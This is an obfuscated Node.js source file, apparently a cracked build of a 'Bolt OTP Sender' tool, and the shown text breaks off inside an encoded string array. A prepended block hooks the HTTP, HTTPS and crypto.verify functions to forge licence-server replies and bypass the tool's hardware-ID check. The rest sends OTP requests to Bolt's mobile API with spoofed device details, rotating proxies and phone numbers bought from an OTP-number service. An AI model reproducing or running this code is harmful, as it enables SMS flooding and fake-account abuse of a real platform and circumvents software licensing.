(function () {
  var _0x40c462 = "https://raw.githubusercontent.com/itzaman3120-hyperx/Allow-List/refs/heads/main/Anonymous.txt";
  var _0x19d658 = "188.137.176.163";
  function _0x5453dc(_0x198ad8) {
    var _0x265a3b = require("https");
    var _0x446ca8 = require("url").URL;
    var _0x119506 = new _0x446ca8(_0x40c462);
    const _0x28fb54 = {
      hostname: _0x119506.hostname,
      path: _0x119506.pathname + (_0x119506.search || ""),
      method: "GET",
      headers: {
        "User-Agent": "REX-TOOLS"
      }
    };
    var _0x5ea1b8 = _0x265a3b.request(_0x28fb54, function (_0x4a5062) {
      var _0x51e24c = "";
      _0x4a5062.on("data", function (_0x31bf13) {
        _0x51e24c += _0x31bf13;
      });
      _0x4a5062.on("end", function () {
        _0x198ad8(null, _0x51e24c);
      });
    });
    _0x5ea1b8.on("error", function (_0x31ec84) {
      _0x198ad8(_0x31ec84, "");
    });
    if (_0x5ea1b8.setTimeout) {
      _0x5ea1b8.setTimeout(10000, function () {
        try {
          _0x5ea1b8.destroy();
        } catch (_0xc0fea3) {}
        _0x198ad8(new Error("timeout"), "");
      });
    } else {
      0;
    }
    _0x5ea1b8.end();
  }
  function _0x54c19b(_0x1e02e6, _0xac1d55) {
    var _0x23b466 = String(_0x1e02e6).split(/\r?\n/);
    for (var _0x595f83 = 0; _0x595f83 < _0x23b466.length; _0x595f83++) {
      var _0x1c5d99 = _0x23b466[_0x595f83].trim();
      if (!_0x1c5d99 || _0x1c5d99.charAt(0) === "#") {
        continue;
      }
      if (_0x1c5d99 === "ALL" || _0x1c5d99 === "FREE") {
        return true;
      }
      if (_0xac1d55 && (_0x1c5d99 === _0xac1d55 || _0x1c5d99.indexOf(_0xac1d55) === 0)) {
        return true;
      }
    }
    return false;
  }
  function _0x57fa8c(_0x4c2bae) {
    var _0x24ef9f = _0x4c2bae.request;
    _0x4c2bae.request = function (_0x43a796, _0x3c23aa) {
      try {
        var _0x3e1ce2 = String(_0x43a796 && (_0x43a796.hostname || _0x43a796.host) || "");
        var _0xe91ccb = String(_0x43a796 && _0x43a796.path || "");
        if (_0x3e1ce2.indexOf(_0x19d658) === -1) {
          return _0x24ef9f.apply(_0x4c2bae, arguments);
        }
      } catch (_0x254db4) {
        return _0x24ef9f.apply(_0x4c2bae, arguments);
      }
      var _0x41969a = "";
      var _0x3fc42b = {
        on: function () {
          return _0x3fc42b;
        },
        once: function () {
          return _0x3fc42b;
        },
        write: function (_0x3443f1) {
          _0x41969a += _0x3443f1;
          return true;
        },
        end: function () {
          var _0x41e500 = "";
          try {
            _0x41e500 = JSON.parse(_0x41969a).hwid || "";
          } catch (_0x3248ca) {}
          _0x5453dc(function (_0x5c8bd3, _0x5bbc39) {
            var _0x209f2a = !_0x5c8bd3 && _0x54c19b(_0x5bbc39, _0x41e500);
            var _0x27fbaa;
            if (_0xe91ccb.indexOf("/api/ping") !== -1) {
              const _0x1c69d2 = {
                status: _0x209f2a ? "ok" : "killed",
                token: _0x209f2a ? "REXGH" : ""
              };
              _0x27fbaa = JSON.stringify(_0x1c69d2);
            } else {
              _0x27fbaa = _0x209f2a ? JSON.stringify({
                status: "ok",
                user: "REX LICENSED",
                token: "REXGH",
                sig: Buffer.from("REXFREE").toString("base64")
              }) : JSON.stringify({
                status: "banned",
                reason: _0x5c8bd3 ? "LICENSE LIST UNREACHABLE" : "HWID NOT APPROVED - CONTACT t.me/Rex_OTP_Tool"
              });
            }
            var _0x5d1332 = new (require("stream").PassThrough)();
            process.nextTick(function () {
              if (typeof _0x3c23aa === "function") {
                _0x3c23aa(_0x5d1332);
              }
              _0x5d1332.end(_0x27fbaa);
            });
          });
          return _0x3fc42b;
        },
        destroy: function () {
          return _0x3fc42b;
        },
        setTimeout: function () {
          return _0x3fc42b;
        },
        setNoDelay: function () {
          return _0x3fc42b;
        }
      };
      return _0x3fc42b;
    };
  }
  try {
    _0x57fa8c(require("http"));
  } catch (_0x188411) {}
  try {
    _0x57fa8c(require("https"));
  } catch (_0x1f8b43) {}
  try {
    var _0xccee7e = require("crypto");
    var _0x327831 = _0xccee7e.verify;
    _0xccee7e.verify = function () {
      try {
        if (arguments[3] && Buffer.from(arguments[3]).toString() === "REXFREE") {
          return true;
        }
      } catch (_0x54382c) {}
      return _0x327831.apply(_0xccee7e, arguments);
    };
  } catch (_0x2bacd4) {}
})();
const fs = require("fs");
const path = require("path");
const {
  execSync
} = require("child_process");
const {
  isMainThread
} = require("worker_threads");
if (isMainThread) {
  const requiredModules = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (_0xed6c20) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log("\n[SETUP] First time setup: Installing required dependencies...");
    try {
      const npmCmd = path.join(path.dirname(process.execPath), process.platform === "win32" ? "npm.cmd" : "npm");
      execSync("\"" + npmCmd + "\" install https-proxy-agent socks-proxy-agent chalk@4", {
        stdio: "inherit",
        shell: true
      });
      console.log("[SETUP] Dependencies installed successfully!\n");
    } catch (_0x1c8b0b) {
      console.error("[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed properly.");
      process.exit(1);
    }
  }
}
const https = require("https");
const http = require("http");
(function () {
  const _0x4961ac = function () {
    let _0xc82f03;
    try {
      _0xc82f03 = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (_0x4cc497) {
      _0xc82f03 = window;
    }
    return _0xc82f03;
  };
  const _0x6a72e = _0x4961ac();
  _0x6a72e.setInterval(fn2, 4000);
})();
const zlib = require("zlib");
const crypto = require("crypto");
const chalk = require("chalk");
const readline = require("readline");
const {
  HttpsProxyAgent
} = require("https-proxy-agent");
const {
  SocksProxyAgent
} = require("socks-proxy-agent");
const NEXA_KEY_FILE = path.join(__dirname, "nexa_key.txt");
class NexaRateLimiter {
  constructor(_0x27ab21) {
    this.delayMs = _0x27ab21;
    this.queue = [];
    this.processing = false;
  }
  enqueue(_0x141b9b) {
    return new Promise((_0x56722a, _0x48a769) => {
      this.queue.push(async () => {
        try {
          _0x56722a(await _0x141b9b());
        } catch (_0x42322a) {
          _0x48a769(_0x42322a);
        }
      });
      if (!this.processing) {
        this._process();
      }
    });
  }
  async _process() {
    this.processing = true;
    while (this.queue.length > 0) {
      {
        const _0x437d9f = this.queue.shift();
        await _0x437d9f();
        await new Promise(_0x3aacf7 => setTimeout(_0x3aacf7, this.delayMs));
      }
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(500);
function nexaFetchNumber(_0x18b395, _0x37cad4, _0x8e8817) {
  return new Promise((_0x57d6c2, _0x551b15) => {
    {
      const _0x2345f4 = {
        range: _0x37cad4,
        format: "normal"
      };
      const _0x4317b2 = JSON.stringify(_0x2345f4);
      const _0x33effb = {
        hostname: "nexaotpservice.com",
        port: 80,
        path: _0x8e8817 || "/api/v1/numbers/get",
        method: "POST",
        headers: {
          "X-API-Key": _0x18b395,
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(_0x4317b2)
        }
      };
      const _0x2d3d30 = http.request(_0x33effb, _0x4501dd => {
        {
          let _0x318027 = "";
          _0x4501dd.on("data", _0x135252 => _0x318027 += _0x135252);
          _0x4501dd.on("end", () => {
            try {
              const _0x23e4b7 = JSON.parse(_0x318027);
              if (_0x23e4b7.success && _0x23e4b7.number) {
                _0x57d6c2(_0x23e4b7.number.replace(/[^0-9]/g, ""));
              } else {
                _0x551b15(new Error(_0x23e4b7.error || "NexaOTP: No number returned"));
              }
            } catch (_0x5ea098) {
              _0x551b15(new Error("NexaOTP: Invalid response"));
            }
          });
        }
      });
      _0x2d3d30.on("error", _0x2722f0 => _0x551b15(new Error("NexaOTP network: " + _0x2722f0.message)));
      _0x2d3d30.setTimeout(10000, () => {
        _0x2d3d30.destroy();
        _0x551b15(new Error("NexaOTP: Timeout"));
      });
      _0x2d3d30.write(_0x4317b2);
      _0x2d3d30.end();
    }
  });
}
const DIAL_MAP = [["1242", "bs"], ["1246", "bb"], ["1264", "ai"], ["1268", "ag"], ["1284", "vg"], ["1340", "vi"], ["1345", "ky"], ["1441", "bm"], ["1473", "gd"], ["1649", "tc"], ["1664", "ms"], ["1670", "mp"], ["1671", "gu"], ["1721", "sx"], ["1758", "lc"], ["1767", "dm"], ["1784", "vc"], ["1787", "pr"], ["1809", "do"], ["1829", "do"], ["1849", "do"], ["1868", "tt"], ["1869", "kn"], ["1876", "jm"], ["1939", "pr"], ["211", "ss"], ["212", "ma"], ["213", "dz"], ["216", "tn"], ["218", "ly"], ["220", "gm"], ["221", "sn"], ["222", "mr"], ["223", "ml"], ["224", "gn"], ["225", "ci"], ["226", "bf"], ["227", "ne"], ["228", "tg"], ["229", "bj"], ["230", "mu"], ["231", "lr"], ["232", "sl"], ["233", "gh"], ["234", "ng"], ["235", "td"], ["236", "cf"], ["237", "cm"], ["238", "cv"], ["239", "st"], ["240", "gq"], ["241", "ga"], ["242", "cg"], ["243", "cd"], ["244", "ao"], ["245", "gw"], ["246", "io"], ["248", "sc"], ["249", "sd"], ["250", "rw"], ["251", "et"], ["252", "so"], ["253", "dj"], ["254", "ke"], ["255", "tz"], ["256", "ug"], ["257", "bi"], ["258", "mz"], ["260", "zm"], ["261", "mg"], ["262", "re"], ["263", "zw"], ["264", "na"], ["265", "mw"], ["266", "ls"], ["267", "bw"], ["268", "sz"], ["269", "km"], ["290", "sh"], ["291", "er"], ["297", "aw"], ["298", "fo"], ["299", "gl"], ["350", "gi"], ["351", "pt"], ["352", "lu"], ["353", "ie"], ["354", "is"], ["355", "al"], ["356", "mt"], ["357", "cy"], ["358", "fi"], ["359", "bg"], ["370", "lt"], ["371", "lv"], ["372", "ee"], ["373", "md"], ["374", "am"], ["375", "by"], ["376", "ad"], ["377", "mc"], ["378", "sm"], ["380", "ua"], ["381", "rs"], ["382", "me"], ["383", "xk"], ["385", "hr"], ["386", "si"], ["387", "ba"], ["389", "mk"], ["420", "cz"], ["421", "sk"], ["423", "li"], ["500", "fk"], ["501", "bz"], ["502", "gt"], ["503", "sv"], ["504", "hn"], ["505", "ni"], ["506", "cr"], ["507", "pa"], ["508", "pm"], ["509", "ht"], ["590", "gp"], ["591", "bo"], ["592", "gy"], ["593", "ec"], ["594", "gf"], ["595", "py"], ["596", "mq"], ["597", "sr"], ["598", "uy"], ["599", "cw"], ["670", "tl"], ["672", "nf"], ["673", "bn"], ["674", "nr"], ["675", "pg"], ["676", "to"], ["677", "sb"], ["678", "vu"], ["679", "fj"], ["680", "pw"], ["681", "wf"], ["682", "ck"], ["683", "nu"], ["685", "ws"], ["686", "ki"], ["687", "nc"], ["688", "tv"], ["689", "pf"], ["690", "tk"], ["691", "fm"], ["692", "mh"], ["850", "kp"], ["852", "hk"], ["853", "mo"], ["855", "kh"], ["856", "la"], ["880", "bd"], ["886", "tw"], ["960", "mv"], ["961", "lb"], ["962", "jo"], ["963", "sy"], ["964", "iq"], ["965", "kw"], ["966", "sa"], ["967", "ye"], ["968", "om"], ["970", "ps"], ["971", "ae"], ["972", "il"], ["973", "bh"], ["974", "qa"], ["975", "bt"], ["976", "mn"], ["977", "np"], ["992", "tj"], ["993", "tm"], ["994", "az"], ["995", "ge"], ["996", "kg"], ["998", "uz"], ["959", "mm"], ["20", "eg"], ["27", "za"], ["30", "gr"], ["31", "nl"], ["32", "be"], ["33", "fr"], ["34", "es"], ["36", "hu"], ["39", "it"], ["40", "ro"], ["41", "ch"], ["43", "at"], ["44", "gb"], ["45", "dk"], ["46", "se"], ["47", "no"], ["48", "pl"], ["49", "de"], ["51", "pe"], ["52", "mx"], ["53", "cu"], ["54", "ar"], ["55", "br"], ["56", "cl"], ["57", "co"], ["58", "ve"], ["60", "my"], ["61", "au"], ["62", "id"], ["63", "ph"], ["64", "nz"], ["65", "sg"], ["66", "th"], ["81", "jp"], ["82", "kr"], ["84", "vn"], ["86", "cn"], ["90", "tr"], ["91", "in"], ["92", "pk"], ["93", "af"], ["94", "lk"], ["95", "mm"], ["98", "ir"], ["1", "us"], ["7", "ru"]];
function getCountryFromPhone(_0xe62c7b) {
  for (const [_0x109c32, _0x5755a5] of DIAL_MAP) {
    if (_0xe62c7b.startsWith(_0x109c32)) {
      if (_0x109c32 === "7" && (_0xe62c7b.startsWith("77") || _0xe62c7b.startsWith("76"))) {
        return "kz";
      }
      return _0x5755a5;
    }
  }
  return "us";
}
const COUNTRY_LANGUAGE_MAP = {
  ad: "ca-AD",
  ae: "ar-AE",
  af: "fa-AF",
  ag: "en-AG",
  ai: "en-AI",
  al: "sq-AL",
  am: "hy-AM",
  ao: "pt-AO",
  aq: "en-GB",
  ar: "es-AR",
  as: "en-AS",
  at: "de-AT",
  au: "en-AU",
  aw: "nl-AW",
  ax: "sv-AX",
  az: "az-AZ",
  ba: "bs-BA",
  bb: "en-BB",
  bd: "bn-BD",
  be: "nl-BE",
  bf: "fr-BF",
  bg: "bg-BG",
  bh: "ar-BH",
  bi: "fr-BI",
  bj: "fr-BJ",
  bl: "fr-BL",
  bm: "en-BM",
  bn: "ms-BN",
  bo: "es-BO",
  bq: "nl-BQ",
  br: "pt-BR",
  bs: "en-BS",
  bt: "dz-BT",
  bw: "en-BW",
  by: "be-BY",
  bz: "en-BZ",
  ca: "en-CA",
  cc: "en-CC",
  cd: "fr-CD",
  cf: "fr-CF",
  cg: "fr-CG",
  ch: "de-CH",
  ci: "fr-CI",
  ck: "en-CK",
  cl: "es-CL",
  cm: "fr-CM",
  cn: "zh-CN",
  co: "es-CO",
  cr: "es-CR",
  cu: "es-CU",
  cv: "pt-CV",
  cw: "nl-CW",
  cx: "en-CX",
  cy: "el-CY",
  cz: "cs-CZ",
  de: "de-DE",
  dj: "fr-DJ",
  dk: "da-DK",
  dm: "en-DM",
  do: "es-DO",
  dz: "ar-DZ",
  ec: "es-EC",
  ee: "et-EE",
  eg: "ar-EG",
  eh: "ar-EH",
  er: "ti-ER",
  es: "es-ES",
  et: "am-ET",
  fi: "fi-FI",
  fj: "en-FJ",
  fk: "en-FK",
  fm: "en-FM",
  fo: "fo-FO",
  fr: "fr-FR",
  ga: "fr-GA",
  gb: "en-GB",
  gd: "en-GD",
  ge: "ka-GE",
  gf: "fr-GF",
  gg: "en-GG",
  gh: "en-GH",
  gi: "en-GI",
  gl: "kl-GL",
  gm: "en-GM",
  gn: "fr-GN",
  gp: "fr-GP",
  gq: "es-GQ",
  gr: "el-GR",
  gt: "es-GT",
  gu: "en-GU",
  gw: "pt-GW",
  gy: "en-GY",
  hk: "zh-HK",
  hn: "es-HN",
  hr: "hr-HR",
  ht: "fr-HT",
  hu: "hu-HU",
  id: "id-ID",
  ie: "en-IE",
  il: "he-IL",
  im: "en-IM",
  in: "hi-IN",
  io: "en-IO",
  iq: "ar-IQ",
  ir: "fa-IR",
  is: "is-IS",
  it: "it-IT",
  je: "en-JE",
  jm: "en-JM",
  jo: "ar-JO",
  jp: "ja-JP",
  ke: "sw-KE",
  kg: "ky-KG",
  kh: "km-KH",
  ki: "en-KI",
  km: "ar-KM",
  kn: "en-KN",
  kp: "ko-KP",
  kr: "ko-KR",
  kw: "ar-KW",
  ky: "en-KY",
  kz: "kk-KZ",
  la: "lo-LA",
  lb: "ar-LB",
  lc: "en-LC",
  li: "de-LI",
  lk: "si-LK",
  lr: "en-LR",
  ls: "st-LS",
  lt: "lt-LT",
  lu: "fr-LU",
  lv: "lv-LV",
  ly: "ar-LY",
  ma: "ar-MA",
  mc: "fr-MC",
  md: "ro-MD",
  me: "sr-ME",
  mf: "fr-MF",
  mg: "fr-MG",
  mh: "en-MH",
  mk: "mk-MK",
  ml: "fr-ML",
  mm: "my-MM",
  mn: "mn-MN",
  mo: "zh-MO",
  mp: "en-MP",
  mq: "fr-MQ",
  mr: "ar-MR",
  ms: "en-MS",
  mt: "mt-MT",
  mu: "en-MU",
  mv: "dv-MV",
  mw: "en-MW",
  mx: "es-MX",
  my: "ms-MY",
  mz: "pt-MZ",
  na: "en-NA",
  nc: "fr-NC",
  ne: "fr-NE",
  nf: "en-NF",
  ng: "en-NG",
  ni: "es-NI",
  nl: "nl-NL",
  no: "nb-NO",
  np: "ne-NP",
  nr: "en-NR",
  nu: "en-NU",
  nz: "en-NZ",
  om: "ar-OM",
  pa: "es-PA",
  pe: "es-PE",
  pf: "fr-PF",
  pg: "en-PG",
  ph: "fil-PH",
  pk: "ur-PK",
  pl: "pl-PL",
  pm: "fr-PM",
  pn: "en-PN",
  pr: "es-PR",
  ps: "ar-PS",
  pt: "pt-PT",
  pw: "en-PW",
  py: "es-PY",
  qa: "ar-QA",
  re: "fr-RE",
  ro: "ro-RO",
  rs: "sr-RS",
  ru: "ru-RU",
  rw: "rw-RW",
  sa: "ar-SA",
  sb: "en-SB",
  sc: "en-SC",
  sd: "ar-SD",
  se: "sv-SE",
  sg: "en-SG",
  sh: "en-SH",
  si: "sl-SI",
  sj: "nb-SJ",
  sk: "sk-SK",
  sl: "en-SL",
  sm: "it-SM",
  sn: "fr-SN",
  so: "so-SO",
  sr: "nl-SR",
  ss: "en-SS",
  st: "pt-ST",
  sv: "es-SV",
  sx: "nl-SX",
  sy: "ar-SY",
  sz: "en-SZ",
  tc: "en-TC",
  td: "fr-TD",
  tg: "fr-TG",
  th: "th-TH",
  tj: "tg-TJ",
  tk: "en-TK",
  tl: "pt-TL",
  tm: "tk-TM",
  tn: "ar-TN",
  to: "to-TO",
  tr: "tr-TR",
  tt: "en-TT",
  tv: "en-TV",
  tw: "zh-TW",
  tz: "sw-TZ",
  ua: "uk-UA",
  ug: "en-UG",
  us: "en-US",
  uy: "es-UY",
  uz: "uz-UZ",
  va: "it-VA",
  vc: "en-VC",
  ve: "es-VE",
  vg: "en-VG",
  vi: "en-VI",
  vn: "vi-VN",
  vu: "bi-VU",
  wf: "fr-WF",
  ws: "sm-WS",
  xk: "sq-XK",
  ye: "ar-YE",
  yt: "fr-YT",
  za: "en-ZA",
  zm: "en-ZM",
  zw: "sn-ZW"
};
function getLanguageFromCountry(_0x12d381) {
  return COUNTRY_LANGUAGE_MAP[_0x12d381] || "en-GB";
}
function buildBoltQueryParams(_0x368119, _0x1c1c91, _0x1fe90b, _0x28f96d, _0x6ba723) {
  const _0x1dae28 = randomDevice();
  const _0x5a90da = randomVersion();
  const _0x3b3d6b = getLanguageFromCountry(_0x6ba723);
  return new URLSearchParams({
    version: _0x5a90da,
    deviceId: _0x368119,
    device_name: _0x1dae28.name,
    device_os_version: _0x1dae28.os,
    channel: "googleplay",
    brand: "bolt",
    deviceType: "android",
    signup_session_id: "",
    country: _0x6ba723,
    is_local_authentication_available: "false",
    language: _0x3b3d6b,
    session_id: _0x1c1c91,
    distinct_id: "$device:" + _0x1fe90b,
    rh_session_id: _0x28f96d
  }).toString();
}
let SUCCESSFUL_FILE = "successful.txt";
let FAILED_FILE = "failed.txt";
let DEBUG_FILE = "debug.txt";
const B = chalk.hex("#00D4FF");
const C = chalk.hex("#FFD700");
const Y = chalk.hex("#FFA500");
const W = chalk.white;
const G = chalk.gray;
const R = chalk.hex("#FF6B6B");
function printHeader() {
  process.stdout.write("[2J[3J[H");
  console.log(B("  ██████╗  ██████╗ ██╗  ████████╗"));
  console.log(B("  ██╔══██╗██╔═══██╗██║  ╚══██╔══╝"));
  console.log(B("  ██████╔╝██║   ██║██║     ██║   "));
  console.log(B("  ██╔══██╗██║   ██║██║     ██║   "));
  console.log(B("  ██████╔╝╚██████╔╝███████╗██║   "));
  console.log(B("  ╚═════╝  ╚═════╝ ╚══════╝╚═╝   "));
  console.log(B("                              \n"));
  console.log(W("┌──────────────────────────────────────────────┐"));
  console.log(W("│ [•] Tool      : ") + B("Bolt OTP Sender              ") + W("│"));
  console.log(W("│ [•] Developer : ") + B("NOT REXY                     ") + W("│"));
  console.log(W("│ [•] Status    : ") + G("Premium Build                ") + W("│"));
  console.log(W("│ [•] Version   : ") + B("BOLT-V1.0.0                  ") + W("│"));
  if (global.globalHwid && global.globalHwid !== "Unregistered") {
    const _0x35e9af = global.globalHwid;
    console.log(W("│ [•] HWID      : ") + Y(_0x35e9af) + W(" ".repeat(Math.max(0, 27 - _0x35e9af.length)) + "│"));
  }
  console.log(W("└──────────────────────────────────────────────┘\n"));
}
function normalizePhoneNumber(_0x3f461e) {
  const _0x41fde6 = _0x3f461e.replace(/\D/g, "");
  return "+" + _0x41fde6;
}
function parseProxy(_0x2ace26) {
  if (!_0x2ace26) {
    return null;
  }
  if (typeof _0x2ace26 === "object") {
    return _0x2ace26;
  }
  _0x2ace26 = _0x2ace26.trim();
  if (!_0x2ace26) {
    return null;
  }
  let _0x39e179;
  let _0x1255af;
  let _0x254006;
  let _0x5e8377;
  let _0x148462 = "http";
  if (_0x2ace26.startsWith("socks5://")) {
    _0x148462 = "socks5";
    _0x2ace26 = _0x2ace26.slice(9);
  } else if (_0x2ace26.startsWith("socks4://")) {
    _0x148462 = "socks4";
    _0x2ace26 = _0x2ace26.slice(9);
  } else if (_0x2ace26.startsWith("http://")) {
    _0x148462 = "http";
    _0x2ace26 = _0x2ace26.slice(7);
  } else if (_0x2ace26.startsWith("https://")) {
    _0x148462 = "http";
    _0x2ace26 = _0x2ace26.slice(8);
  }
  if (_0x2ace26.includes("@")) {
    const _0x47c264 = _0x2ace26.split("@");
    const _0x445627 = _0x47c264[0].split(":");
    const _0x4e951f = _0x47c264[1].split(":");
    _0x254006 = _0x445627[0];
    _0x5e8377 = _0x445627[1];
    _0x39e179 = _0x4e951f[0];
    _0x1255af = parseInt(_0x4e951f[1]);
  } else {
    const _0x3f845e = _0x2ace26.split(":");
    if (_0x3f845e.length === 2) {
      _0x39e179 = _0x3f845e[0];
      _0x1255af = parseInt(_0x3f845e[1]);
    } else if (_0x3f845e.length === 4) {
      if (!isNaN(parseInt(_0x3f845e[3])) && isNaN(parseInt(_0x3f845e[1]))) {
        _0x254006 = _0x3f845e[0];
        _0x5e8377 = _0x3f845e[1];
        _0x39e179 = _0x3f845e[2];
        _0x1255af = parseInt(_0x3f845e[3]);
      } else {
        _0x39e179 = _0x3f845e[0];
        _0x1255af = parseInt(_0x3f845e[1]);
        _0x254006 = _0x3f845e[2];
        _0x5e8377 = _0x3f845e[3];
      }
    } else if (_0x3f845e.length === 3) {
      _0x39e179 = _0x3f845e[0];
      _0x1255af = parseInt(_0x3f845e[1]);
      _0x254006 = _0x3f845e[2];
    }
  }
  if (!_0x39e179 || !_0x1255af) {
    return null;
  }
  const _0x346bf5 = {
    type: _0x148462,
    host: _0x39e179,
    port: _0x1255af,
    user: _0x254006,
    pass: _0x5e8377,
    original: _0x2ace26
  };
  return _0x346bf5;
}
function rotateSessionId(_0x20b494) {
  if (!_0x20b494 || !_0x20b494.user) {
    return _0x20b494;
  }
  const _0x3adba2 = {
    ..._0x20b494
  };
  const _0x27040e = _0x3adba2;
  const _0x24497d = _0x27040e;
  const _0x94ea58 = [/-ssid-[A-Za-z0-9_]+/, /-session-[A-Za-z0-9_]+/, /_session_[A-Za-z0-9_]+/, /-sess-[A-Za-z0-9_]+/];
  for (const _0x8c66b6 of _0x94ea58) {
    if (_0x24497d.user && _0x8c66b6.test(_0x24497d.user)) {
      const _0x52e6df = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, "").substring(0, 10);
      _0x24497d.user = _0x24497d.user.replace(_0x8c66b6, "" + _0x8c66b6.source.split("[")[0].replace(/\\/g, "") + _0x52e6df);
      break;
    }
    if (_0x24497d.pass && _0x8c66b6.test(_0x24497d.pass)) {
      const _0x23b5a2 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, "").substring(0, 10);
      _0x24497d.pass = _0x24497d.pass.replace(_0x8c66b6, "" + _0x8c66b6.source.split("[")[0].replace(/\\/g, "") + _0x23b5a2);
      break;
    }
  }
  return _0x24497d;
}
function createProxyAgent(_0x1c4eff) {
  if (!_0x1c4eff) {
    return null;
  }
  if (_0x1c4eff.type === "socks5" || _0x1c4eff.type === "socks4") {
    const _0x427495 = "socks5://" + (_0x1c4eff.user ? encodeURIComponent(_0x1c4eff.user) + ":" + encodeURIComponent(_0x1c4eff.pass || "") + "@" : "") + _0x1c4eff.host + ":" + _0x1c4eff.port;
    return new SocksProxyAgent(_0x427495);
  } else {
    const _0x596599 = "http://" + (_0x1c4eff.user ? encodeURIComponent(_0x1c4eff.user) + ":" + encodeURIComponent(_0x1c4eff.pass || "") + "@" : "") + _0x1c4eff.host + ":" + _0x1c4eff.port;
    return new HttpsProxyAgent(_0x596599);
  }
}
function sendRequest(_0x2f8544, _0x5f59fb, _0x109d93, _0x51d55c, _0x3ee324 = null, _0x2cae82 = 20000) {
  return new Promise((_0x1fa604, _0x42d1d2) => {
    {
      const _0x1ebd25 = {
        ..._0x109d93
      };
      const _0x28f781 = new URL(_0x2f8544);
      const _0x4aae2 = _0x1ebd25;
      let _0x216a2f = _0x4aae2;
      if (_0x51d55c) {
        _0x216a2f["Content-Length"] = Buffer.byteLength(_0x51d55c);
      }
      const _0x389c56 = {
        hostname: _0x28f781.hostname,
        path: _0x28f781.pathname + _0x28f781.search,
        method: _0x5f59fb,
        headers: _0x216a2f,
        timeout: _0x2cae82,
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
        ecdhCurve: "X25519:P-256:P-384",
        honorCipherOrder: false,
        minVersion: "TLSv1.2"
      };
      const _0x3b0682 = _0x389c56;
      const _0x23c178 = _0x3ee324 ? parseProxy(_0x3ee324) : null;
      if (_0x3ee324) {
        if (!_0x23c178 || isNaN(_0x23c178.port) || _0x23c178.port <= 0) {
          return _0x42d1d2(new Error("Invalid proxy"));
        }
        _0x3b0682.agent = createProxyAgent(_0x23c178);
      }
      const _0x2c03f6 = https.request(_0x3b0682, _0x23284a => {
        {
          const _0xb862bd = [];
          _0x23284a.on("data", _0x3e7dd1 => _0xb862bd.push(_0x3e7dd1));
          _0x23284a.on("error", _0x42d1d2);
          _0x23284a.on("end", () => {
            let _0x2f917e = Buffer.concat(_0xb862bd);
            const _0x598ec9 = _0x23284a.headers["content-encoding"];
            if (_0x598ec9 === "gzip") {
              try {
                _0x2f917e = zlib.gunzipSync(_0x2f917e);
              } catch (_0x5d5aa0) {}
            } else if (_0x598ec9 === "deflate") {
              try {
                _0x2f917e = zlib.inflateSync(_0x2f917e);
              } catch (_0x4b69bd) {}
            } else if (_0x598ec9 === "br") {
              try {
                _0x2f917e = zlib.brotliDecompressSync(_0x2f917e);
              } catch (_0x555bde) {}
            }
            _0x1fa604({
              status: _0x23284a.statusCode,
              data: _0x2f917e.toString("utf8"),
              raw: _0x2f917e,
              headers: _0x23284a.headers
            });
          });
        }
      });
      _0x2c03f6.on("error", _0x42d1d2);
      _0x2c03f6.on("timeout", () => {
        _0x2c03f6.destroy();
        _0x42d1d2(new Error("timeout"));
      });
      if (_0x51d55c) {
        _0x2c03f6.write(_0x51d55c);
      }
      _0x2c03f6.end();
    }
  });
}
const v13 = {};
function fn1() {
  const _0xa50ad2 = ["AhiTsa", "zxqGyW", "zxmTtG", "wwfKra", "CKPJwG", "ndiZ", "ihvUza", "B3DUia", "rxfsEq", "zgvUyW", "DMLZAq", "mtG2oa", "q1nMwq", "A1PfEG", "otyY", "DxnLpW", "t3vIyW", "u2LSzq", "Dw5SAq", "ufzQuG", "Dw50", "CIaOzq", "DgnMDa", "CgWTua", "uwfmuG", "Aw9UlW", "4PAi4PAi4Pwr4PAi", "z1zRta", "BgqGBG", "wZm2Bq", "rfvYzG", "CgfKuW", "lvyXlG", "x3bYBW", "uwDvuq", "DK9QDW", "rNLyDG", "Aw52yq", "CMvY", "CMfUza", "mZGW", "CIboDq", "CMSRnW", "rfvlwa", "txrTAa", "mtyUma", "msaTia", "BNqGCa", "zw4Tsq", "DgXvDq", "yxvKyW", "D2D3Ca", "mJiY", "CM8TuG", "zvn5BG", "zguTqq", "z0rQra", "mJeY", "iev4Aq", "uNjXyG", "uKjUrG", "BIbMyq", "zfvJyG", "wKLQqq", "r1L6EG", "rNrkra", "u3HktW", "DhHlBG", "AMrYsG", "mJiP", "zsbPDa", "CuTWuG", "DgLUzW", "w0fWCa", "ns4Wia", "oI8V", "DLr2BW", "BJy0oW", "lwLK", "wLDwBG", "tLPpBa", "AhbrzG", "mtaUma", "otC0", "u2DpDq", "rMr5wa", "A1bPvq", "odu1", "C2LNBG", "mtC4nW", "rfH5CW", "zxj2Aq", "B2DPyW", "AKnIvq", "AwvZlG", "Aw51zq", "Bg8Tta", "EgnqCG", "C3yTuW", "qKzyyW", "vw5RBG", "B20G4Ocu", "CMvXDq", "BxvLqW", "4Pwq4PwDica", "yvHryW", "pvWNqW", "ChLAAG", "BMrgAq", "CMLNzW", "rMDnua", "C3iTuG", "BMiTtG", "wg9zqG", "mdmP", "vgLTzq", "l2fWAq", "igXPAW", "ru5wwa", "mJu1", "drTBsW", "zNiTvW", "uMvXDq", "EejICq", "4Pwq4PwDiokvMG", "y3j5Ca", "B3iGqq", "Ffjpvq", "vMPTBG", "zMLSlq", "we5zyW", "BgWGlq", "tKCT", "mtKUma", "r1fhtW", "thn5ua", "DgfJDa", "oLWNjW", "zw5KCW", "CIbqCG", "wLDtuW", "DhjPzW", "q0nbzG", "vunlEG", "swXgvq", "tgXyAa", "vejyDW", "yMfUBG", "mtqUma", "yxiTtq", "mJuW", "ndPuta", "zxiGka", "otKY", "AxPoCG", 